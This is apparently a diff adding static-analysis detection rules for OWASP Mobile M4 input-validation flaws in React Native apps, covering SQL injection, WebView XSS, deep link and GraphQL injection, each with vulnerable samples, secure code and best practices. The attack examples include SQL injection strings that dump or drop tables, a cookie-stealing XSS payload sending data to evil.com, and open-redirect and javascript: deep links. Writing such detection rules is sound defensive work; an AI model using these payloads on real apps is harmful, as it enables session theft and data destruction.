@@ -1,0 +1,843 @@
+rules:
+  # OWASP Mobile Top 10 - M4: Insufficient Input/Output Validation (React Native)
+  # SQL Injection, XSS, Deep Link Injection for React Native apps
+  # Platform: React Native (JavaScript/TypeScript)
+  # Sources: OWASP Mobile 2024, React Native Security Best Practices
+
+  # ============ SQL INJECTION ============
+
+  - id: owasp-m4-react-native-sql-injection
+    patterns:
+      - pattern-either:
+          - pattern: |
+              db.executeSql(`$QUERY`, ...)
+          - pattern: |
+              db.executeSql("$QUERY", ...)
+          - pattern: |
+              db.transaction(tx => {
+                tx.executeSql(`$QUERY`, ...);
+              })
+      - metavariable-pattern:
+          metavariable: $QUERY
+          patterns:
+            - pattern-either:
+                - pattern: |
+                    `... WHERE ... = ${$VAR} ...`
+                - pattern: |
+                    `... WHERE ... = '${$VAR}' ...`
+                - pattern: |
+                    "... WHERE ... = " + $VAR + "..."
+    message: |
+      SQL Injection vulnerability in React Native (OWASP M4: Insufficient Input/Output Validation).
+      Building SQL queries with template literals or concatenation allows injection attacks.
+
+      VULNERABLE PATTERNS:
+      ```javascript
+      // VULNERABLE: Template literal injection
+      const userId = params.id;
+      db.executeSql(
+        `SELECT * FROM users WHERE id = ${userId}`,
+        [],
+        (tx, results) => { /* ... */ }
+      );
+
+      // VULNERABLE: String concatenation
+      const userName = userInput;
+      db.executeSql(
+        "SELECT * FROM users WHERE name = '" + userName + "'",
+        [],
+        callback
+      );
+
+      // VULNERABLE: In transaction
+      db.transaction(tx => {
+        tx.executeSql(
+          `DELETE FROM items WHERE id = ${itemId}`,  // DANGEROUS
+        );
+      });
+      ```
+
+      ATTACK EXAMPLES:
+      ```javascript
+      // Input: userId = "1 OR 1=1"
+      // Query: SELECT * FROM users WHERE id = 1 OR 1=1
+      // Returns all users!
+
+      // Input: userName = "'; DROP TABLE users; --"
+      // Query: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
+      // Deletes entire table!
+      ```
+
+      SECURE IMPLEMENTATION:
+      ```javascript
+      import SQLite from 'react-native-sqlite-storage';
+
+      class SecureDatabase {
+        constructor() {
+          this.db = SQLite.openDatabase({
+            name: 'mydb.db',
+            location: 'default',
+          });
+        }
+
+        // Use parameterized queries
+        async getUserById(userId) {
+          return new Promise((resolve, reject) => {
+            this.db.executeSql(
+              'SELECT * FROM users WHERE id = ?',  // Parameter placeholder
+              [userId],  // Parameters array prevents injection
+              (tx, results) => {
+                const users = [];
+                for (let i = 0; i < results.rows.length; i++) {
+                  users.push(results.rows.item(i));
+                }
+                resolve(users);
+              },
+              (error) => reject(error)
+            );
+          });
+        }
+
+        // Multiple parameters
+        async searchUsers(name, minAge) {
+          return new Promise((resolve, reject) => {
+            this.db.executeSql(
+              'SELECT * FROM users WHERE name LIKE ? AND age >= ?',
+              [`%${name}%`, minAge],
+              (tx, results) => {
+                resolve(this._parseResults(results));
+              },
+              (error) => reject(error)
+            );
+          });
+        }
+
+        // Insert with parameters
+        async createUser(name, email, age) {
+          return new Promise((resolve, reject) => {
+            this.db.transaction(tx => {
+              tx.executeSql(
+                'INSERT INTO users (name, email, age) VALUES (?, ?, ?)',
+                [name, email, age],
+                (tx, results) => {
+                  resolve(results.insertId);
+                },
+                (tx, error) => reject(error)
+              );
+            });
+          });
+        }
+
+        // Update with parameters
+        async updateUser(userId, updates) {
+          const {name, email} = updates;
+          return new Promise((resolve, reject) => {
+            this.db.executeSql(
+              'UPDATE users SET name = ?, email = ? WHERE id = ?',
+              [name, email, userId],
+              (tx, results) => resolve(results.rowsAffected),
+              (error) => reject(error)
+            );
+          });
+        }
+
+        // Delete with parameters
+        async deleteUser(userId) {
+          return new Promise((resolve, reject) => {
+            this.db.executeSql(
+              'DELETE FROM users WHERE id = ?',
+              [userId],
+              (tx, results) => resolve(results.rowsAffected),
+              (error) => reject(error)
+            );
+          });
+        }
+
+        _parseResults(results) {
+          const items = [];
+          for (let i = 0; i < results.rows.length; i++) {
+            items.push(results.rows.item(i));
+          }
+          return items;
+        }
+      }
+
+      // Usage
+      const db = new SecureDatabase();
+      const user = await db.getUserById(userId);
+      ```
+
+      WATERMELONDB SECURE PATTERNS:
+      ```javascript
+      import {Q} from '@nozbe/watermelondb';
+
+      class SecureWatermelonDB {
+        async findUserByEmail(email) {
+          const users = await database.get('users')
+            .query(Q.where('email', email))  // Safe parameterized query
+            .fetch();
+          return users[0];
+        }
+
+        async searchUsers(keyword) {
+          const users = await database.get('users')
+            .query(
+              Q.where('name', Q.like(`%${Q.sanitizeLikeString(keyword)}%`))
+            )
+            .fetch();
+          return users;
+        }
+      }
+      ```
+
+      BEST PRACTICES:
+      - ALWAYS use ? placeholders with parameter arrays
+      - NEVER use template literals or string concatenation for SQL
+      - Use ORM methods when available (WatermelonDB, Realm)
+      - Validate ALL user inputs before queries
+      - Use prepared statements
+      - Implement least privilege database access
+
+      Reference: OWASP SQL Injection Prevention, react-native-sqlite-storage docs
+    severity: ERROR
+    languages:
+      - javascript
+      - typescript
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      owasp-mobile-2024: "M4: Insufficient Input/Output Validation"
+      confidence: HIGH
+
+  # ============ WEBVIEW XSS ============
+
+  - id: owasp-m4-react-native-webview-xss
+    patterns:
+      - pattern-either:
+          - pattern: |
+              <WebView source={{html: $HTML}} />
+          - pattern: |
+              <WebView source={{html: `$HTML`}} />
+          - pattern: |
+              <WebView html={$HTML} />
+          - pattern: |
+              webViewRef.injectJavaScript($JS)
+      - pattern-not: |
+          <WebView source={{html: "..."}} />
+    message: |
+      Cross-Site Scripting (XSS) in React Native WebView (OWASP M4: Insufficient Input/Output Validation).
+      Loading untrusted HTML or injecting unsanitized JavaScript can execute malicious code.
+
+      VULNERABLE PATTERNS:
+      ```javascript
+      import {WebView} from 'react-native-webview';
+
+      // VULNERABLE: User-controlled HTML
+      const UserContent = ({userHtml}) => (
+        <WebView
+          source={{html: userHtml}}  // DANGEROUS
+        />
+      );
+
+      // VULNERABLE: Template literal with user data
+      const ProfileView = ({userName, bio}) => {
+        const html = `
+          <html>
+            <body>
+              <h1>${userName}</h1>
+              <p>${bio}</p>
+            </body>
+          </html>
+        `;
+
+        return <WebView source={{html}} />;
+      };
+
+      // VULNERABLE: JavaScript injection
+      const MessageView = ({message}) => {
+        const webViewRef = useRef(null);
+
+        useEffect(() => {
+          webViewRef.current?.injectJavaScript(
+            `showMessage('${message}')`  // DANGEROUS
+          );
+        }, [message]);
+
+        return <WebView ref={webViewRef} />;
+      };
+      ```
+
+      ATTACK EXAMPLES:
+      ```javascript
+      // XSS via username:
+      userName = "<script>alert(document.cookie)</script>"
+
+      // XSS via bio:
+      bio = "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
+
+      // JavaScript injection:
+      message = "'); maliciousCode(); //'"
+      ```
+
+      SECURE IMPLEMENTATION:
+      ```javascript
+      import {WebView} from 'react-native-webview';
+      import DOMPurify from 'isomorphic-dompurify';
+
+      class SecureWebView extends React.Component {
+        // Sanitize HTML
+        sanitizeHtml(rawHtml) {
+          return DOMPurify.sanitize(rawHtml, {
+            ALLOWED_TAGS: ['h1', 'h2', 'p', 'a', 'b', 'i', 'ul', 'ol', 'li'],
+            ALLOWED_ATTR: ['href', 'class'],
+            ALLOW_DATA_ATTR: false,
+          });
+        }
+
+        // Escape HTML entities
+        escapeHtml(text) {
+          const map = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#x27;',
+            '/': '&#x2F;',
+          };
+          return text.replace(/[&<>"'/]/g, (char) => map[char]);
+        }
+
+        // Create safe HTML with CSP
+        createSecureHtml(content) {
+          const escapedContent = this.escapeHtml(content);
+          return `
+            <!DOCTYPE html>
+            <html>
+              <head>
+                <meta charset="UTF-8">
+                <meta http-equiv="Content-Security-Policy"
+                      content="default-src 'self'; script-src 'none'; object-src 'none';">
+                <style>
+                  body { font-family: sans-serif; padding: 20px; }
+                </style>
+              </head>
+              <body>
+                ${escapedContent}
+              </body>
+            </html>
+          `;
+        }
+
+        // Safe JavaScript injection
+        injectSafeJavaScript(data) {
+          // Serialize data safely
+          const safeData = JSON.stringify(data).replace(/</g, '\\u003c');
+
+          this.webViewRef.injectJavaScript(`
+            (function() {
+              try {
+                window.receiveData(${safeData});
+              } catch (e) {
+                console.error('Error receiving data:', e);
+              }
+            })();
+          `);
+        }
+
+        render() {
+          const {userContent} = this.props;
+          const safeHtml = this.createSecureHtml(userContent);
+
+          return (
+            <WebView
+              ref={ref => this.webViewRef = ref}
+              source={{html: safeHtml}}
+              javaScriptEnabled={false}  // Disable if not needed
+              onMessage={this.handleMessage}
+              onShouldStartLoadWithRequest={this.handleNavigation}
+            />
+          );
+        }
+
+        handleMessage = (event) => {
+          // Validate messages from WebView
+          try {
+            const data = JSON.parse(event.nativeEvent.data);
+            // Process validated data
+          } catch (e) {
+            console.error('Invalid message from WebView');
+          }
+        };
+
+        handleNavigation = (request) => {
+          // Validate navigation requests
+          const {url} = request;
+
+          // Whitelist allowed domains
+          const allowedHosts = [
+            'app.example.com',
+            'api.example.com',
+          ];
+
+          try {
+            const urlObj = new URL(url);
+            if (!allowedHosts.includes(urlObj.hostname)) {
+              return false;  // Block navigation
+            }
+          } catch (e) {
+            return false;  // Invalid URL
+          }
+
+          return true;  // Allow navigation
+        };
+      }
+
+      // Usage
+      const App = () => {
+        const [userBio, setUserBio] = useState('');
+
+        return (
+          <SecureWebView userContent={userBio} />
+        );
+      };
+      ```
+
+      CONTENT SECURITY POLICY:
+      ```javascript
+      const createHtmlWithCSP = (content) => `
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <meta http-equiv="Content-Security-Policy"
+                  content="
+                    default-src 'self';
+                    script-src 'none';
+                    style-src 'self' 'unsafe-inline';
+                    img-src 'self' data: https:;
+                    connect-src 'self';
+                    object-src 'none';
+                    base-uri 'self';
+                    form-action 'self';
+                  ">
+          </head>
+          <body>${content}</body>
+        </html>
+      `;
+      ```
+
+      POSTMESSAGE SECURITY:
+      ```javascript
+      // In WebView HTML
+      const webViewHtml = `
+        <script>
+          window.addEventListener('message', function(event) {
+            // Validate message origin
+            if (event.origin !== 'react-native://') {
+              return;
+            }
+
+            // Validate message format
+            try {
+              const data = JSON.parse(event.data);
+              // Process safe data
+            } catch (e) {
+              console.error('Invalid message');
+            }
+          });
+        </script>
+      `;
+
+      // In React Native
+      webViewRef.current?.postMessage(JSON.stringify(safeData));
+      ```
+
+      BEST PRACTICES:
+      - Sanitize all HTML before loading (use DOMPurify)
+      - Escape user input (convert < to &lt;)
+      - Use Content Security Policy headers
+      - Disable JavaScript if not needed
+      - Validate WebView messages
+      - Whitelist allowed navigation URLs
+      - Never inject unsanitized data into JavaScript
+
+      Reference: OWASP XSS Prevention, react-native-webview Security
+    severity: ERROR
+    languages:
+      - javascript
+      - typescript
+    metadata:
+      category: security
+      cwe: "CWE-79: Cross-Site Scripting"
+      owasp-mobile-2024: "M4: Insufficient Input/Output Validation"
+      confidence: HIGH
+
+  # ============ DEEP LINK INJECTION ============
+
+  - id: owasp-m4-react-native-deeplink-no-validation
+    patterns:
+      - pattern-either:
+          - pattern: |
+              Linking.getInitialURL()
+          - pattern: |
+              Linking.addEventListener('url', $HANDLER)
+          - pattern: |
+              useLinking($CONFIG)
+      - pattern-not-inside: |
+          if ($URL.startsWith('https://')) {
+            ...
+          }
+      - pattern-not-inside: |
+          if ($VALIDATION) {
+            ...
+          }
+    message: |
+      Deep link without validation (OWASP M4: Insufficient Input/Output Validation).
+      Unvalidated deep links can lead to URL injection, phishing, open redirects, and data theft.
+
+      VULNERABLE PATTERNS:
+      ```javascript
+      import {Linking} from 'react-native';
+      import {useNavigation} from '@react-navigation/native';
+
+      // VULNERABLE: No validation
+      const App = () => {
+        const navigation = useNavigation();
+
+        useEffect(() => {
+          Linking.getInitialURL().then(url => {
+            if (url) {
+              const route = url.replace('myapp://', '');
+              navigation.navigate(route);  // DANGEROUS
+            }
+          });
+
+          const listener = Linking.addEventListener('url', ({url}) => {
+            const route = url.replace('myapp://', '');
+            navigation.navigate(route);  // DANGEROUS
+          });
+
+          return () => listener.remove();
+        }, []);
+
+        return <View />;
+      };
+
+      // VULNERABLE: React Navigation with no validation
+      const linking = {
+        prefixes: ['myapp://', 'https://app.example.com'],
+        config: {
+          screens: {
+            Profile: 'user/:id',  // No validation of :id
+            WebView: 'web',       // Can load any URL
+          },
+        },
+      };
+      ```
+
+      ATTACK EXAMPLES:
+      ```javascript
+      // Open redirect:
+      myapp://web?url=https://evil.com
+
+      // Phishing:
+      myapp://login?redirect=https://fake-login.com
+
+      // Parameter injection:
+      myapp://user/1'--?admin=true
+
+      // XSS in WebView:
+      myapp://web?url=javascript:alert(1)
+      ```
+
+      SECURE IMPLEMENTATION:
+      ```javascript
+      import {Linking} from 'react-native';
+      import {useNavigation} from '@react-navigation/native';
+
+      class SecureDeepLinkHandler {
+        static ALLOWED_SCHEMES = ['myapp', 'https'];
+        static ALLOWED_HOSTS = ['app.example.com', 'api.example.com'];
+
+        static validateDeepLink(url) {
+          try {
+            const urlObj = new URL(url);
+
+            // Validate scheme
+            if (!this.ALLOWED_SCHEMES.includes(urlObj.protocol.replace(':', ''))) {
+              console.warn('Invalid scheme:', urlObj.protocol);
+              return null;
+            }
+
+            // Validate host (for https URLs)
+            if (urlObj.protocol === 'https:' &&
+                !this.ALLOWED_HOSTS.includes(urlObj.hostname)) {
+              console.warn('Invalid host:', urlObj.hostname);
+              return null;
+            }
+
+            // Validate path
+            const validPaths = ['/home', '/profile', '/settings', '/item'];
+            const isValidPath = validPaths.some(path =>
+              urlObj.pathname.startsWith(path)
+            );
+
+            if (!isValidPath) {
+              console.warn('Invalid path:', urlObj.pathname);
+              return null;
+            }
+
+            return {
+              path: urlObj.pathname,
+              params: this.sanitizeParams(urlObj.searchParams),
+            };
+          } catch (error) {
+            console.error('Invalid URL:', error);
+            return null;
+          }
+        }
+
+        static sanitizeParams(searchParams) {
+          const sanitized = {};
+          const allowedParams = ['id', 'category', 'page', 'tab'];
+
+          for (const [key, value] of searchParams) {
+            if (allowedParams.includes(key)) {
+              // Sanitize value
+              sanitized[key] = this.sanitizeValue(value);
+            }
+          }
+
+          return sanitized;
+        }
+
+        static sanitizeValue(value) {
+          // Remove dangerous characters
+          return value
+            .replace(/[<>"']/g, '')
+            .substring(0, 100);  // Limit length
+        }
+
+        static isValidRedirectUrl(url) {
+          try {
+            const urlObj = new URL(url);
+
+            // Must be HTTPS
+            if (urlObj.protocol !== 'https:') {
+              return false;
+            }
+
+            // Whitelist domains
+            return this.ALLOWED_HOSTS.includes(urlObj.hostname);
+          } catch {
+            return false;
+          }
+        }
+      }
+
+      // React Navigation with validation
+      const SecureApp = () => {
+        const navigation = useNavigation();
+
+        useEffect(() => {
+          // Handle initial URL
+          Linking.getInitialURL().then(url => {
+            if (url) {
+              const validated = SecureDeepLinkHandler.validateDeepLink(url);
+              if (validated) {
+                navigation.navigate(validated.path, validated.params);
+              } else {
+                navigation.navigate('Error', {
+                  message: 'Invalid deep link'
+                });
+              }
+            }
+          });
+
+          // Handle incoming URLs
+          const subscription = Linking.addEventListener('url', ({url}) => {
+            const validated = SecureDeepLinkHandler.validateDeepLink(url);
+            if (validated) {
+              navigation.navigate(validated.path, validated.params);
+            } else {
+              console.warn('Blocked invalid deep link:', url);
+              Alert.alert('Security Alert', 'Invalid link received');
+            }
+          });
+
+          return () => subscription.remove();
+        }, [navigation]);
+
+        return <NavigationContainer />;
+      };
+
+      // React Navigation Linking with validation
+      const linking = {
+        prefixes: ['myapp://', 'https://app.example.com'],
+        config: {
+          screens: {
+            Profile: {
+              path: 'user/:id',
+              parse: {
+                id: (id) => {
+                  // Validate ID format
+                  if (!/^\d+$/.test(id)) {
+                    throw new Error('Invalid user ID');
+                  }
+                  return parseInt(id, 10);
+                },
+              },
+            },
+            WebView: {
+              path: 'web',
+              parse: {
+                url: (url) => {
+                  // Validate redirect URL
+                  if (!SecureDeepLinkHandler.isValidRedirectUrl(url)) {
+                    throw new Error('Invalid redirect URL');
+                  }
+                  return url;
+                },
+              },
+            },
+          },
+        },
+        // Add custom getStateFromPath for additional validation
+        getStateFromPath: (path, options) => {
+          const state = getStateFromPathDefault(path, options);
+
+          // Additional validation
+          if (state) {
+            const currentRoute = state.routes[state.routes.length - 1];
+            if (currentRoute.params) {
+              // Validate all params
+              for (const [key, value] of Object.entries(currentRoute.params)) {
+                if (typeof value === 'string' && /<script/i.test(value)) {
+                  console.warn('XSS attempt blocked in deep link');
+                  return undefined;  // Block navigation
+                }
+              }
+            }
+          }
+
+          return state;
+        },
+      };
+
+      const App = () => (
+        <NavigationContainer linking={linking}>
+          <Stack.Navigator>
+            <Stack.Screen name="Profile" component={ProfileScreen} />
+            <Stack.Screen name="WebView" component={WebViewScreen} />
+          </Stack.Navigator>
+        </NavigationContainer>
+      );
+      ```
+
+      RATE LIMITING:
+      ```javascript
+      class DeepLinkRateLimiter {
+        constructor(maxRequests = 10, timeWindow = 60000) {
+          this.maxRequests = maxRequests;
+          this.timeWindow = timeWindow;
+          this.requests = [];
+        }
+
+        isAllowed() {
+          const now = Date.now();
+          this.requests = this.requests.filter(
+            time => now - time < this.timeWindow
+          );
+
+          if (this.requests.length >= this.maxRequests) {
+            console.warn('Deep link rate limit exceeded');
+            return false;
+          }
+
+          this.requests.push(now);
+          return true;
+        }
+      }
+
+      const rateLimiter = new DeepLinkRateLimiter();
+
+      Linking.addEventListener('url', ({url}) => {
+        if (!rateLimiter.isAllowed()) {
+          Alert.alert('Too many requests', 'Please slow down');
+          return;
+        }
+        // Handle deep link
+      });
+      ```
+
+      BEST PRACTICES:
+      - Whitelist allowed schemes, hosts, and paths
+      - Validate all URL components separately
+      - Sanitize query parameters
+      - Validate parameter types (IDs must be numeric, etc.)
+      - Never trust deep link data
+      - Log suspicious deep link attempts
+      - Implement rate limiting
+      - Use HTTPS for Universal Links
+      - Show user confirmation for sensitive actions
+
+      Reference: OWASP Mobile Deep Link Security, React Navigation Security
+    severity: ERROR
+    languages:
+      - javascript
+      - typescript
+    metadata:
+      category: security
+      cwe: "CWE-601: URL Redirection to Untrusted Site"
+      owasp-mobile-2024: "M4: Insufficient Input/Output Validation"
+      confidence: HIGH
+
+  # ============ GRAPHQL INJECTION ============
+
+  - id: owasp-m4-react-native-graphql-injection
+    patterns:
+      - pattern-either:
+          - pattern: |
+              gql`query { $QUERY }`
+          - pattern: |
+              gql`mutation { $MUTATION }`
+          - pattern: |
+              `query { user(id: ${$ID}) { ... } }`
+      - pattern-not: |
+          gql`query { ... }`
+    message: |
+      GraphQL injection risk (OWASP M4: Insufficient Input/Output Validation).
+      Building GraphQL queries with template literals can allow injection attacks.
+
+      SECURE IMPLEMENTATION:
+      ```javascript
+      import {gql, useQuery} from '@apollo/client';
+
+      // SECURE: Use variables
+      const GET_USER = gql`
+        query GetUser($id: ID!) {
+          user(id: $id) {
+            name
+            email
+          }
+        }
+      `;
+
+      const UserProfile = ({userId}) => {
+        const {data} = useQuery(GET_USER, {
+          variables: {id: userId},  // Safe parameterization
+        });
+
+        return <Text>{data?.user?.name}</Text>;
+      };
+      ```
+
+      Never build queries with string interpolation.
+    severity: ERROR
+    languages:
+      - javascript
+      - typescript
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      owasp-mobile-2024: "M4: Insufficient Input/Output Validation"
+      confidence: HIGH
